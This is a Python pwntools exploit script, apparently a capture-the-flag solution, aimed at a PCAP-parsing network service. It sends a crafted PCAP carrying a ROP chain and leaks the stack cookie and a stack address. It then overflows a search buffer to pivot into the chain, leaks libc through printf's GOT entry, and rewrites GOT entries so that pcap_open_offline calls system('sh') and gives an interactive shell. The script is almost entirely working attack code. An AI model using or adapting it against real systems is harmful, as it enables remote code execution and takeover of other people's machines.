import pwn
import time
import scapy.all

# PCAP Header crafting
pcap = ""
pcap += pwn.p32(0xa1b2c3d4) # PCAP magic
pcap += pwn.p16(2) # PCAP 2.4
pcap += pwn.p16(4) 
pcap += pwn.p32(0) # UTC
pcap += pwn.p32(0) # sigfigs
pcap += pwn.p32(65535) # caplen
pcap += pwn.p32(1) # ethernet

# Helper function to populate packet headers in PCAP file
def add_packet_header(sl, l):
    global pcap
    pcap += pwn.p32(int(time.time()))
    pcap += pwn.p32(0)
    pcap += pwn.p32(sl)
    pcap += pwn.p32(l)


## ROP Gadgets
# 0x00402083: pop rdi ; ret  ;  (1 found)
POP_RDI = 0x00402083
# 0x00402081: pop rsi ; pop r15 ; ret  ;  (1 found)
POP_RSI_R15 = 0x00402081
# 0x0040207d: pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret  ;  (1 found)
POP_RSP = 0x0040207d
# 0x00400ed8: pop rbp ; ret  ;  (1 found)
POP_RBP = 0x00400ed8

## Libc functions
ATOI = 0x400DE0
NTOHL = 0x400e10
PCAP_OPEN_OFFLINE = 0x400d30
PRINTF = 0x400CD0
SPRINTF = 0x400DF0

## Libc functions in .got.plt
PRINTF_GOT_PLT = 0x603068
PCAP_OPEN_OFFLINE_GOT_PLT = 0x603098
ATOI_GOT_PLT = 0x6030f0

## Strings
# \tVersion: %d\n
STR_VERSION_PS = 0x4020EE

## Libc offsets
# Offset of printf in target libc
LIBC_PRINTF = 0x00000000000544f0
# Offset of system in target libs
LIBC_SYSTEM = 0x0000000000044c40

## Helper buffers populated by client
# ...these are actually dst and src filter addresses
# Address of pop rdi; ret shell to overwrite atoi in .got.plt
BUFFER_POPRDI = 0x6032C0
# Address of 'sh\x00\x00'
BUFFER_SH = 0x6032C4


## Stage2 ROP, in PCAP packet
rop_s2 = ""
# three junk registers popped from stage1
rop_s2 += pwn.cyclic(3*8)
# eax <- 0 ; via ntohl() call
rop_s2 += pwn.p64(POP_RDI)
rop_s2 += pwn.p64(0)
rop_s2 += pwn.p64(NTOHL)
# leak printf in .got.plt
rop_s2 += pwn.p64(POP_RDI)
rop_s2 += pwn.p64(STR_VERSION_PS)
rop_s2 += pwn.p64(POP_RSI_R15)
rop_s2 += pwn.p64(PRINTF_GOT_PLT)
rop_s2 += pwn.p64(0x0)
rop_s2 += pwn.p64(PRINTF)
# return to main program again, the client will now populate BUFFER_* crap
rop_s2 += pwn.p64(0x401E14)
# sprintf(atoi@got.plt, &`pop rdi; ret`);
rop_s2 += pwn.p64(POP_RDI)
rop_s2 += pwn.p64(ATOI_GOT_PLT)
rop_s2 += pwn.p64(POP_RSI_R15)
rop_s2 += pwn.p64(BUFFER_POPRDI)
rop_s2 += pwn.p64(0)
rop_s2 += pwn.p64(SPRINTF)
# zero eax for nest sprintf...
rop_s2 += pwn.p64(POP_RDI)
rop_s2 += pwn.p64(0)
rop_s2 += pwn.p64(NTOHL)
# sprintf(atoi@got.plt+4, &0);
rop_s2 += pwn.p64(POP_RDI)
rop_s2 += pwn.p64(ATOI_GOT_PLT+4)
rop_s2 += pwn.p64(POP_RSI_R15)
rop_s2 += pwn.p64(0x402516)
rop_s2 += pwn.p64(0)
rop_s2 += pwn.p64(SPRINTF)
# sprintf(atoi@got.plt+5, &0);
rop_s2 += pwn.p64(POP_RDI)
rop_s2 += pwn.p64(ATOI_GOT_PLT+5)
rop_s2 += pwn.p64(POP_RSI_R15)
rop_s2 += pwn.p64(0x402516)
rop_s2 += pwn.p64(0)
rop_s2 += pwn.p64(SPRINTF)
# ...atoi@got.plt is now pointing to a pop rdi; ret gadget
# Call fgets()/atoi() gadget to overwrite pcap_open_offline wit system from client
rop_s2 += pwn.p64(POP_RBP)
rop_s2 += pwn.p64(PCAP_OPEN_OFFLINE_GOT_PLT + 0x20)
rop_s2 += pwn.p64(0x401A87) # fgets/atoi trick
# pcap_open_offline/system('sh\x00\x00')
rop_s2 += pwn.p64(POP_RDI)
rop_s2 += pwn.p64(BUFFER_SH)
rop_s2 += pwn.p64(PCAP_OPEN_OFFLINE)

## Craft Ethernet/IP/TCP packet with Stage2 ROP CHain
p = scapy.all.Ether(dst="00:11:22:33:44:55", src="00:11:22:33:44:66")/ \
    scapy.all.IP(dst="10.0.0.2", src="10.0.0.1", len=1000)/ \
    scapy.all.TCP(dport=80, sport=12345)/ \
    ("foobarbazz" + rop_s2)
## Stuff packet into PCAP
p = bytes(p)
add_packet_header(len(p), 180)
pcap += p

## Connect to remote server, send PCAP (with Stage2 ROP Chain)
r = pwn.remote('200.200.200.5', 9998)
r.recvuntil("size: ")
r.send(str(len(pcap)) + '\n')
r.recvuntil('\n')
r.send(pcap)


## Trigger info leak from PCAP
pwn.log.info("Running info leak...")
r.recvuntil('>> ')
r.send('6\n')
r.recvuntil("<Payload>\n")
byte_dump = r.recvuntil('>> ')
print byte_dump.split('\n\n')[0]
cookie_line = byte_dump.split('\n')[20]
cookie = pwn.u64((''.join(cookie_line.split()[18:18+8])).decode('hex'))
pwn.log.info("Cookie: %016x", cookie)

stack_line = byte_dump.split('\n')[4]
stack_v = pwn.u64((''.join(stack_line.split()[18:18+8])).decode('hex'))
pwn.log.info("Stack value: %016x", stack_v)

# Address of Stage2 ROP Chain
tcp_buffer = stack_v + 0x320 + 8
pwn.log.info("TCP bytes at %016x", tcp_buffer)

## Prepare stack-pivot-into-Stage2 payload
pwn.log.info("Smashing stack with search payload...")
r.send('5\n')
r.recvuntil(':')
payload = ""
payload += pwn.cyclic(24) # buffer
payload += pwn.p64(cookie) # stack cookie
payload += pwn.p64(0xDEADBEEF)
payload += pwn.p64(POP_RSP)
payload += pwn.p64(tcp_buffer)

# Verify constraints
assert '\n' not in payload
print len(payload)
assert len(payload) <= 72


r.send(payload + '\n')
r.recvuntil('>> ')
r.send('7\n')

r.recvuntil('IP: ')
printf_got = pwn.u64(r.recvuntil("\n")[:8].rstrip('\n').ljust(8, "\x00"))
pwn.log.info("printf.got.plt is %016x", printf_got)

libc_base = printf_got - LIBC_PRINTF
pwn.log.info("libc is at %016x", libc_base)
system = libc_base + LIBC_SYSTEM

## By now, the Stage2 ROP Chain will re-run main.
# Send a null payload
r.send('0\n')
# Send pop rdi; ret address into src port/BUFFER_POPRDI
r.recvuntil('>>')
pwn.log.info("Setting src port to pop rdi; ret address")
r.send('1\n')
r.recvuntil(': ')
r.send('.'.join(str(ord(c)) for c in pwn.pack(POP_RDI)) + '\n')
# Send 'sh\x00\x00' into src port/BUFFER_POPRDI
r.recvuntil('>>')
pwn.log.info("Setting dst port to sh\\x00\\x00")
r.send('2\n')
r.recvuntil(': ')
r.send('.'.join(str(ord(c)) for c in "sh\x00\x00") + '\n')
# Exit from main, back into ROP chain
r.send('7\n')
r.recv(1024)

## By now, the Stage2 ROP Chain will hang on fgets()
# This will overwrite pop_open_offline
r.send(pwn.p64(system) + "\n")
# Shell get!
r.interactive()
